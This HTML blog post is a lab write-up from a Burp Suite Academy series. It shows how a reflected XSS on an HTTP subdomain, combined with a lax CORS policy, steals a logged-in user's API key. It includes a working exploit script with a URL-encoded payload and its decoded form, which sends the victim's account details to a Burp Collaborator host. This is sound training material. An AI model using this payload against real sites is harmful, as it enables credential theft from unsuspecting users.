<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Exploiting XSS via CORS trust relationships </title>
  <meta name="description" content="Hello world">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Exploiting XSS via CORS trust relationships" />
<meta property="og:description" content="Example test article that contains basic HTML elements for text formatting on the Web." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.fishsec.xyz/post/exploiting-xss-cors/" />
<meta property="article:published_time" content="2020-01-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-01-09T00:00:00+00:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Exploiting XSS via CORS trust relationships"/>
<meta name="twitter:description" content="Example test article that contains basic HTML elements for text formatting on the Web."/>

  
  
    
  
  
  
  <link rel="stylesheet" href="https://blog.fishsec.xyz/css/style-dark.css">
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://blog.fishsec.xyz/images/favicon.ico" />

  
</head>


<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

    <header id="header">
  <a href="https://blog.fishsec.xyz/">
  
    <div id="logo" style="background-image: url(https://blog.fishsec.xyz/images/logo.png)"></div>
  
  <div id="title">
    <h1>Fish Security</h1>
  </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about">About</a></li>
       
        <li><a href="/post">Posts</a></li>
      
    </ul>
  </div>
</header>
  

    
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <div class="content" itemprop="articleBody">
  
    <p>Continuing the Burp Suite Academy series. Today, we will go through CORS exploitations exercises&hellip;</p>
<p>The web application is the same online store which allows a user to log-in, change his e-mail address and retrieve his API key. This time around, the server only trusts requests originating from subdomains of the app.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-http" data-lang="http"><span style="color:#447fcf">GET</span> <span style="color:#447fcf;text-decoration:underline">/api/requestApiKey</span> <span style="color:#6ab825;font-weight:bold">HTTP</span>/<span style="color:#3677a9">1.1</span>
Host: &lt;instanceId&gt;.web-security-academy.net
Origin: https://subdomain.&lt;instanceId&gt;.web-security-academy.net
Cookie: sessionid=...
</code></pre></div><p>Response:</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-fallback" data-lang="fallback">HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.&lt;instanceId&gt;.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json
X-XSS-Protection: 0
Connection: close
Content-Length: 89

{
  &#34;username&#34;: &#34;******&#34;,
  &#34;email&#34;: &#34;&#34;,
  &#34;apikey&#34;: &#34;********************************&#34;
}
</code></pre></div><p>Further testing reveals that the server is configured to accept <strong>any protocol</strong> as long as the request comes from a subdomain of the main application <code>&lt;instanceId&gt;.web-security-academy.net</code>.</p>
<p>This version of the application has a new function which allows a user to check the remaining stock of a given item. The request looks like this:</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-http" data-lang="http"><span style="color:#447fcf">GET</span> <span style="color:#447fcf;text-decoration:underline">/?productId=1&amp;storeId=1</span> <span style="color:#6ab825;font-weight:bold">HTTP</span>/<span style="color:#3677a9">1.1</span>
Host: stock.&lt;instanceId&gt;.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: ...
Accept: ...
Accept-Encoding: ...
Accept-Language: ...
Connection: close
</code></pre></div><p>The paramater <code>productId</code> is not validated nor sanitized, and is vulnerable to reflected Cross-site Scripting.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-fallback" data-lang="fallback">HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8
Set-Cookie: session=5t8SM9hnfSxy91QpvWQ4o7rPMK8pg05H; Secure; HttpOnly
X-XSS-Protection: 0
Connection: close
Content-Length: 76

&lt;h4&gt;ERROR&lt;/h4&gt;Invalid product ID: &lt;script&gt;alert(&#34;document.domain&#34;);&lt;/script&gt;
</code></pre></div><p>Since the <code>stock.&lt;...&gt;</code> subdomain is running on <code>HTTP</code> (not <code>HTTPs</code>), the <code>session</code> cookies will never be transmitted to the browser. Therefore, our XSS will not be able to retrieve any of those. Right now, the impact of the vulnerability seems quite limited. Except, it is not !</p>
<p>We saw earlier that the server is configured to pass session cookies for any (cross-origin) request coming from a subdomain of the app, <strong>regardless</strong> of the protocol.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-fallback" data-lang="fallback">Access-Control-Allow-Origin: &lt;protocol&gt;://subdomain.&lt;instanceId&gt;.web-security-academy.net
Access-Control-Allow-Credentials: true
</code></pre></div><p>Therefore, it is possible for us to leverage this CORS (mis)configuration to bypass the limitations of Same Origin Policy (SOP) and retrieve the API key with a cross-origin request. Consider the following attack scenario:</p>
<ol>
<li>Attacker hosts a malicious file in a server of his control</li>
<li>Attacker send a link to his exploit to Victim (who is already logged-in the main app)</li>
<li>Victim accesses the link and is redirected to <code>stock.&lt;instanceId&gt;.web-security-academy.net</code></li>
<li>Victim&rsquo;s browser triggers the <code>rXSS</code> payload when rendering the page</li>
<li>Victim&rsquo;s browser requests his <code>apikey</code> on the main app. At this point, the <code>Origin</code> of this request will be a trusted subdomain with protocol <code>http</code>. Therefore the server CORS config will allow the request to go through</li>
<li>Victim&rsquo;s browser sends the <code>apikey</code> to the Attacker&rsquo;s server</li>
<li>Et voil√† !</li>
</ol>
<p>This the the payload I used to solve the corresponding exercise in BS Academy. It follows the aforementioned steps one-by-one. You can use the exploit server provided in the lab and conveniently force the Victim to visit it. In reality, the last part would require a little bit of social-engineering :-).</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-html" data-lang="html">&lt;<span style="color:#6ab825;font-weight:bold">script</span>&gt;
<span style="color:#6ab825;font-weight:bold">let</span> burpInstanceUrl = <span style="color:#ed9d13">&#34;&lt;Your generated instance URL&gt;&#34;</span>;
<span style="color:#999;font-style:italic">/* We URL-encode our payload to prevent any hiccups when the browser will attempt render and execute the reflected XSS */</span>
<span style="color:#6ab825;font-weight:bold">let</span> xssPayload = <span style="color:#ed9d13">&#34;%3c%73%63%72%69%70%74%3e%6c%65%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%78%68%72%2e%6f%70%65%6e%28%22%47%45%54%22%2c%22%68%74%74%70%73%3a%2f%2f%61%63%65%35%31%66%63%39%31%65%65%32%36%32%65%33%38%30%62%32%35%31%38%65%30%30%62%63%30%30%64%31%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%74%72%75%65%29%3b%78%68%72%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%3d%74%72%75%65%3b%78%68%72%2e%6f%6e%6c%6f%61%64%3d%72%65%71%4c%69%73%74%65%6e%65%72%3b%78%68%72%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%7b%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%3a%2f%2f%74%64%61%6b%67%35%66%79%6b%78%62%38%72%6b%64%70%62%32%63%70%69%6b%61%6c%6a%63%70%36%64%76%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%3f%22%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3c%2f%73%63%72%69%70%74%3e&#34;</span>;
<span style="color:#999;font-style:italic">/* Step 2: Leverage the reflected XSS vulnerability in the subdomain to make an AJAX call and recover the victim&#39;s API key */</span>
<span style="color:#6ab825;font-weight:bold">let</span> trustedUrl = <span style="color:#ed9d13">`http://stock.</span><span style="color:#ed9d13">${</span>burpInstanceUrl<span style="color:#ed9d13">}</span><span style="color:#ed9d13">.web-security-academy.net/?productId=</span><span style="color:#ed9d13">${</span>xssPayload<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&amp;storeId=1`</span>;
<span style="color:#999;font-style:italic">/*  Step 1: Redirect the victim to the subdomain whitelisted in CORS configuration */</span>
<span style="color:#24909d">document</span>.location = trustedUrl;
&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;
</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:44;-o-tab-size:44;tab-size:44"><code class="language-html" data-lang="html"><span style="color:#999;font-style:italic">&lt;!-- Decoded xssPayload --&gt;</span>
&lt;<span style="color:#6ab825;font-weight:bold">script</span>&gt;
  <span style="color:#6ab825;font-weight:bold">let</span> xhr = <span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest();
  xhr.open(
    <span style="color:#ed9d13">&#34;GET&#34;</span>,
    <span style="color:#ed9d13">&#34;https://${your_instance_url}.web-security-academy.net/accountDetails&#34;</span>,
    <span style="color:#6ab825;font-weight:bold">true</span>
  );
  xhr.withCredentials = <span style="color:#6ab825;font-weight:bold">true</span>;
  xhr.onload = reqListener;
  xhr.send();
  <span style="color:#6ab825;font-weight:bold">function</span> reqListener() {
    location =
      <span style="color:#ed9d13">&#34;http://subdomain.burpcollaborator.net/?&#34;</span> +
      <span style="color:#6ab825;font-weight:bold">this</span>.responseText;
  }
&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;

</code></pre></div><p>Tags: #cors,#burp-suite-academy</p>
  
  </div>
</article>


    <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2020  Fish Security 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/about">About</a></li>
         
        <li><a href="/post">Posts</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
  
</body>

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="https://blog.fishsec.xyz/css/badge.css">
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/js/main.js"></script>
</html>
